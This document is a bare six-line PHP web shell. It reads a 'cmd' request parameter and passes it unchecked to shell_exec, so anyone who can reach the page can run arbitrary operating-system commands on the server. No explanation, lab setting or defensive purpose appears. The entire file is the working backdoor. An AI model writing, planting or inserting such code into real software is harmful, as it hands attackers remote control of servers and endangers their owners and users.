<?php
if (isset($_REQUEST["cmd"])) {
    $cmd = $_REQUEST["cmd"];
    shell_exec($cmd);
}
?>